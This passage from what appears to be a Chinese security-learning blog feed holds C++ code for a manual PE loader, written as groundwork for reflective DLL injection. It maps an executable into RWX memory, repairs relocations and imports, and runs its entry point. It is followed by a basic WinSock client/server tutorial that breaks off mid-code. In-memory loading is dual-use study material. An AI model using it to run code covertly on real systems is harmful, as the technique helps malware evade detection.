class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PEdata</span> &#123;</span><br><span class="line">PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader;</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存映像整大小</span></span><br><span class="line"><span class="type">size_t</span> memSize;</span><br><span class="line"><span class="comment">//PE头映像大小</span></span><br><span class="line"><span class="type">size_t</span> memHeaderSize;</span><br><span class="line"><span class="comment">//节区映像大小</span></span><br><span class="line"><span class="type">size_t</span> sectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存起始地址</span></span><br><span class="line">DWORD64 imageBase;</span><br><span class="line">&#125;pedata;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">loadPEstruct</span><span class="params">(BYTE* rawdata)</span> </span>&#123;</span><br><span class="line">pedata.dosHeader = (PIMAGE_DOS_HEADER)rawdata;</span><br><span class="line">pedata.ntHeader = (PIMAGE_NT_HEADERS)(rawdata + pedata.dosHeader-&gt;e_lfanew);</span><br><span class="line">pedata.fileHeader = &amp;(pedata.ntHeader-&gt;FileHeader);</span><br><span class="line">pedata.optionalHeader = &amp;(pedata.ntHeader-&gt;OptionalHeader);</span><br><span class="line"></span><br><span class="line">pedata.imageBase = pedata.optionalHeader-&gt;ImageBase;</span><br><span class="line">pedata.memSize = pedata.optionalHeader-&gt;SizeOfImage;</span><br><span class="line">pedata.memHeaderSize = pedata.optionalHeader-&gt;SizeOfHeaders;</span><br><span class="line">pedata.sectionAlignment = pedata.optionalHeader-&gt;SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">mapToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="type">errno_t</span> err = <span class="built_in">fopen_s</span>(&amp;file, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">size_t</span> fileSize = <span class="built_in">ftell</span>(file);</span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">fileData</span><span class="params">(<span class="keyword">new</span> BYTE[fileSize])</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!fileData) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(fileData.<span class="built_in">get</span>(), <span class="number">1</span>, fileSize, file);</span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功申请内存: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(fileData.<span class="built_in">get</span>()));</span><br><span class="line"><span class="keyword">return</span> fileData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">makeHeadandSectionMap</span><span class="params">(LPVOID memBase, <span class="type">const</span> BYTE* fileBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始映射节区--------\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(memBase, fileBase, pedata.memHeaderSize);</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pedata.ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pedata.fileHeader-&gt;NumberOfSections; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress == <span class="number">0</span> &amp;&amp; sectionHeader[i].SizeOfRawData == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID srcMem = (LPVOID)(fileBase + sectionHeader[i].PointerToRawData);</span><br><span class="line">LPVOID dstMem = (BYTE*)memBase + sectionHeader[i].VirtualAddress;</span><br><span class="line"><span class="type">size_t</span> sizeOfRawData = sectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(dstMem, srcMem, sizeOfRawData);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 节区%d: %s, 映射到内存 0x%llX\n&quot;</span>, i, sectionHeader[i].Name, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(dstMem));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------映射节区结束--------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareReloc</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------开始修复重定位表-------\n&quot;</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)memBase + pedata.optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="type">size_t</span> delta = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase) - pedata.optionalHeader-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (relTable == <span class="literal">nullptr</span> || delta == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (relTable-&gt;SizeOfBlock != <span class="number">0</span> &amp;&amp; relTable-&gt;VirtualAddress != <span class="number">0</span>) &#123;</span><br><span class="line">WORD* pRdata = (WORD*)((BYTE*)relTable + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="type">size_t</span> dataNum = (relTable-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 表%d:\n&quot;</span>, j);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dataNum; i++) &#123;</span><br><span class="line">DWORD type = pRdata[i] &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">DWORD64* targetAddress = (DWORD64*)((BYTE*)memBase + relTable-&gt;VirtualAddress + (pRdata[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 对应地址: 0x%llX 数据: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(targetAddress), *targetAddress);</span><br><span class="line">*targetAddress += delta;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   -&gt; 0x%llX  delta: 0x%llX\n&quot;</span>, *targetAddress, delta);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relTable + relTable-&gt;SizeOfBlock);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------修复重定位表结束-------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareIAT</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始修复IAT--------\n&quot;</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)memBase + pedata.optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">while</span> (importDesc-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="type">char</span>* Dllname = (<span class="type">char</span>*)((BYTE*)memBase + importDesc-&gt;Name);</span><br><span class="line">HMODULE hDll = <span class="built_in">GetModuleHandleA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL:%s\n&quot;</span>, Dllname);</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL失败,导入函数终止\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - DLL已存在:%s\n&quot;</span>, Dllname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; INT[i].u1.AddressOfData; i++) &#123;</span><br><span class="line">DWORD64 pFunc = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 targetFunc = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;((BYTE*)memBase + INT[i].u1.AddressOfData);</span><br><span class="line"><span class="keyword">if</span> (targetFunc &amp; IMAGE_ORDINAL_FLAG) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以序号:%d 导入函数\n&quot;</span>, <span class="built_in">IMAGE_ORDINAL</span>(targetFunc));</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, <span class="built_in">MAKEINTRESOURCEA</span>(<span class="built_in">IMAGE_ORDINAL</span>(targetFunc)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以名称:%s 导入函数\n&quot;</span>, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFunc) &#123;</span><br><span class="line">IAT[i].u1.Function = pFunc;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入成功\n   - 目的地址: 0x%llX\n&quot;</span>, pFunc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">importDesc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修复IAT结束--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">setImageBase</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)memBase;</span><br><span class="line">IMAGE_NT_HEADERS* ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)memBase + dosHeader-&gt;e_lfanew);</span><br><span class="line">ntHeader-&gt;OptionalHeader.ImageBase = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修正镜像基地址成功--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* targetPath = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::unique_ptr&lt;BYTE[]&gt; fileBase = <span class="built_in">mapToMemory</span>(targetPath);</span><br><span class="line"><span class="keyword">if</span> (!fileBase) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">loadPEstruct</span>(fileBase.<span class="built_in">get</span>());</span><br><span class="line"></span><br><span class="line">LPVOID memBase = <span class="built_in">VirtualAllocEx</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="literal">nullptr</span>, pedata.memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!memBase) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">makeHeadandSectionMap</span>(memBase, fileBase.<span class="built_in">get</span>());</span><br><span class="line"><span class="built_in">repareReloc</span>(memBase);</span><br><span class="line"><span class="built_in">repareIAT</span>(memBase);</span><br><span class="line"><span class="built_in">setImageBase</span>(memBase);</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(<span class="built_in">GetCurrentProcess</span>(), memBase, pedata.memSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;开始执行\n&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> targetFunc = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">int</span>(*)(<span class="type">void</span>)&gt;((BYTE*)memBase + ((PIMAGE_NT_HEADERS)((BYTE*)memBase + ((PIMAGE_DOS_HEADER)memBase)-&gt;e_lfanew))-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="built_in">targetFunc</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(<span class="built_in">GetCurrentProcess</span>(), memBase, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目前未解决的问题"><a href="#目前未解决的问题" class="headerlink" title="目前未解决的问题"></a>目前未解决的问题</h2><ul><li>对DLL的载入，下次学反射DLL注入的时候试试</li><li>若文件本身有UPX等壳，修正的所有内容均为壳的内容，壳解压后并不能还原PE本身的映射到偏移地址，导致报错</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近想学DLL反射注入，但是发现要手动生成内存的DLL文件，所以就先尝试学PE加载器的实现&lt;/p&gt;
&lt;p&gt;跟着佬的博客学的，感觉讲的很详细&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.kn0sky.com/?p=37&quot;&gt;手工模拟PE加载器 - 我可是会飞的啊&lt;/</summary>
      
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="实践" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="DLL注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/DLL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>网络编程1-CS模型</title>
    <link href="https://www.pri87.vip/posts/7e127f51.html"/>
    <id>https://www.pri87.vip/posts/7e127f51.html</id>
    <published>2024-12-13T05:37:28.000Z</published>
    <updated>2024-12-13T06:22:42.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CS模型"><a href="#CS模型" class="headerlink" title="CS模型"></a>CS模型</h2><p>Client&#x2F;Server模型，客户端和服务端模型，服务端程序在服务器上一直开放，等待客户端程序接入。客户端程序在用户电脑上执行，打开后主动给服务端发送请求，然后建立连接，相互通信，直到服务端或客户端取消连接。</p><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p>socket：英文原意是插座。它是TCP协议的端口，由于TCP提供的是点对点通信，因此每条TCP连接都由一组套接字确定。socket介于应用层和传输层之间，通过IP实现主机间的交流，通过port实现应用之间的交流。</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>$$<br>socket &#x3D; (IP:port)<br>$$</p><p>$$<br>TCP连接 ::&#x3D;{socket_1,socket_2}<br>$$</p><p>其中的两个socket分别为客户端和服务端的ip与端口号。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li>流式套接字：用于TCP</li><li>数据包套接字：用于UDP</li><li>原始套接字：用于自定义底层协议</li></ul><h4 id="CPP实现方法"><a href="#CPP实现方法" class="headerlink" title="CPP实现方法"></a>CPP实现方法</h4><p>Windows中，使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>来使用套接字</p><h3 id="CS具体内容"><a href="#CS具体内容" class="headerlink" title="CS具体内容"></a>CS具体内容</h3><p>服务端和客户端分别建立套接字，设定对应ip和port</p><p>服务端等待连接，客户端请求连接</p><p>连接成功后，相互发送消息到缓冲区</p><p>结束后关闭。</p><p><img src="https://s2.loli.net/2024/12/13/BKviqpCyVWOrLNt.png" alt="网上找的"></p><h3 id="CPP实现"><a href="#CPP实现" class="headerlink" title="CPP实现"></a>CPP实现</h3><p>socket函数，创建socket并设定模式，这里使用TCP</p><p>bind函数，绑定socket到ip:port上</p><p>listen函数，服务器监听对应端口有无信息</p><p>accept函数无限等待连接，获取客户端套接字，返回后表示连接成功，connect函数请求连接</p><p>recv函数接收数据，send函数发送数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">WSADATA data;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data))<span class="comment">//用于初始化库函数</span></span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;WSAdata初始化失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET cSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (cSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;套接字创建失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in saddr;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">InetPton</span>(AF_INET, <span class="string">L&quot;127.0.0.1&quot;</span>, &amp;saddr.sin_addr);<span class="comment">//将本地数据转换为网络端序（大端序）</span></span><br><span class="line"></span><br><span class="line">saddr.sin_port = <span class="built_in">htons</span>(<span class="number">4567</span>);<span class="comment">//同上，端口可自行指定</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(cSocket, (SOCKADDR*)&amp;saddr, <span class="built_in">sizeof</span>(saddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;连接到服务器失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* sendData = <span class="string">&quot;Hello,world&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(cSocket, sendData, <span class="built_in">strlen</span>(sendData), <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;发送数据失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">WSADATA data;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data))</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;WSAdata初始化失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET sSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (sSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;套接字创建失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in saddr;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = <span class="built_in">htons</span>(<span class="number">4567</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(sSocket, (SOCKADDR*)&amp;saddr, <span class="built_in">sizeof</span>(saddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;绑定失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(sSocket, SOMAXCONN) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;监听失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET 